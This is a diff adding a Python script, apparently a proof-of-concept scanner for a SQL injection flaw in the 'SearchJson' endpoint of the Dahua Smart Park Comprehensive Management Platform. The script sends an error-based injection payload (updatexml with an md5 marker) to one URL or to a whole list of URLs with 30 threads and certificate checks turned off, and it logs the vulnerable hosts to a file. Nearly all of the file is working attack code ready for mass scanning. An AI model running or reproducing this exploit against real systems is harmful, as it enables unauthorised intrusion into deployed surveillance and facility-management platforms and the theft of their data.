@@ -1,0 +1,55 @@
+import argparse,json,requests,sys,re
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def banner():
+    test="""
+
+
+██████╗  █████╗ ██╗  ██╗██╗   ██╗ █████╗     ███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗     ██╗███████╗ ██████╗ ███╗   ██╗
+██╔══██╗██╔══██╗██║  ██║██║   ██║██╔══██╗    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║     ██║██╔════╝██╔═══██╗████╗  ██║
+██║  ██║███████║███████║██║   ██║███████║    ███████╗█████╗  ███████║██████╔╝██║     ███████║     ██║███████╗██║   ██║██╔██╗ ██║
+██║  ██║██╔══██║██╔══██║██║   ██║██╔══██║    ╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║██   ██║╚════██║██║   ██║██║╚██╗██║
+██████╔╝██║  ██║██║  ██║╚██████╔╝██║  ██║    ███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║╚█████╔╝███████║╚██████╔╝██║ ╚████║
+╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
+                                                                                                                                
+                                                               author:zm                                                                 
+"""
+    print(test)
+def main():
+    banner()
+    parer=argparse.ArgumentParser(description='This is SearchJson SQL injection vulnerability in Dahua Smart Park Comprehensive Management Platform')
+    parer.add_argument('-u','--url',dest='url',type=str,help='Please enter your link')
+    parer.add_argument('-f','--file',dest='file',type=str,help='Please enter your file path')
+    ages=parer.parse_args()
+    if ages.url and not ages.file:
+        poc(ages.url)
+    elif ages.file and not ages.url:
+        url_list=[]
+        with open (ages.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(30)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+def poc(target):
+    payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D'
+    header1={
+        'user-agent':'mozilla/5.0 (macintosH; intEl mAC Os x 10_14_3) apPleWebkit/605.1.15 (KHtml, liKe geckO) version/12.0.3 safari/605.1.15',
+        'accept-encoding':'gzip, deflate',
+    }
+    try:
+        res1=requests.get(url=target+payload,headers=header1,verify=False,timeout=5)
+        match = re.search(r'~([0-9a-fA-F]+)', res1.text)
+        if match and match.group(1) == '1e469dbcb9211897b5f5ebf866c66f3':
+            print(f"[+] {target} 存在漏洞 “{target+payload}”")
+            with open('result2.txt', 'a', encoding='utf-8') as f:
+                f.write(target + '\n')
+        else:
+            print(f"[-] {target} 没有漏洞")
+    except:
+        pass
+if __name__=='__main__':
+    main()
